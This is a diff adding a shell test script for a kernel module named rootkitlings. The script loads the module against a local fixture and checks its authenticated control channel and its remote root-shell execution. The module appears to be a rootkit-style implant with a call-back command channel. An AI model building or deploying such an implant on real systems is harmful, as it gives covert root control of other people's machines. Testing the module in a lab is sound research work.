@@ -1,0 +1,120 @@
+#!/bin/sh
+# shellcheck source=/dev/null
+. /vm/checks/lib.sh
+
+begin "Authenticated control channel"
+
+test_port=9999
+test_key="000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f"
+fixture_dir=$(mktemp -d)
+
+ifconfig lo 127.0.0.1 up
+
+secure_agent_fixture serve "$fixture_dir" "$test_port" 127.0.0.1 "$test_key" &
+fixture_pid=$!
+
+timeout=30
+elapsed=0
+while [ ! -f "$fixture_dir/ready" ] && [ "$elapsed" -lt "$timeout" ]; do
+	sleep 0.1
+	elapsed=$((elapsed + 1))
+done
+if [ ! -f "$fixture_dir/ready" ]; then
+	_fail "fixture did not become ready"
+	kill "$fixture_pid" 2>/dev/null; wait "$fixture_pid" 2>/dev/null
+	summary
+fi
+
+load rootkitlings.ko peer_address=127.0.0.1 peer_port="$test_port" \
+	retry_base_ms=25 retry_max_ms=200 control_key="$test_key" \
+	shell_timeout_ms=3000
+
+wait_marker()
+{
+	_timeout=300
+	_elapsed=0
+	while [ ! -f "$fixture_dir/$1" ] && [ "$_elapsed" -lt "$_timeout" ]; do
+		sleep 0.1
+		_elapsed=$((_elapsed + 1))
+	done
+	[ -f "$fixture_dir/$1" ]
+}
+
+if wait_marker replay_rejected; then
+	_ok "authenticated protocol exchange complete"
+else
+	_fail "authenticated protocol exchange failed"
+fi
+
+if wait_marker tamper_rejected; then
+	_ok "tampered message rejected"
+else
+	_fail "tampered message not rejected"
+fi
+
+if wait_marker root_shell_complete; then
+	_ok "root shell execution succeeded"
+else
+	_fail "root shell execution failed"
+fi
+
+if wait_marker control_complete; then
+	_ok "control channel commands verified"
+else
+	_fail "control channel commands failed"
+fi
+
+if wait_marker quit_complete; then
+	_ok "clean session termination"
+else
+	_fail "clean session termination failed"
+fi
+
+if wait_marker shell_replay_rejected; then
+	_ok "shell command replay rejected"
+else
+	_fail "shell command replay not rejected"
+fi
+
+if wait_marker shell_tamper_rejected; then
+	_ok "shell command tamper rejected"
+else
+	_fail "shell command tamper not rejected"
+fi
+
+if wait_marker shell_refused; then
+	_ok "connection-refused shell reported correctly"
+else
+	_fail "connection-refused shell not handled"
+fi
+
+if wait_marker shell_timeout; then
+	_ok "shell timeout reported correctly"
+else
+	_fail "shell timeout not handled"
+fi
+
+if wait_marker blocked_receive; then
+	_ok "fixture reached final stage"
+else
+	_fail "fixture did not reach final stage"
+fi
+
+unload rootkitlings
+
+if wait_marker eof; then
+	_ok "fixture protocol completed"
+else
+	_fail "fixture did not complete"
+fi
+
+wait "$fixture_pid" 2>/dev/null
+
+if dmesg | grep -Eqi '(BUG:|WARNING:|Oops:|KASAN:|UBSAN:|hung task)'; then
+	_fail "kernel log contains a fault report"
+else
+	_ok "kernel log is clean"
+fi
+
+rm -rf "$fixture_dir"
+summary
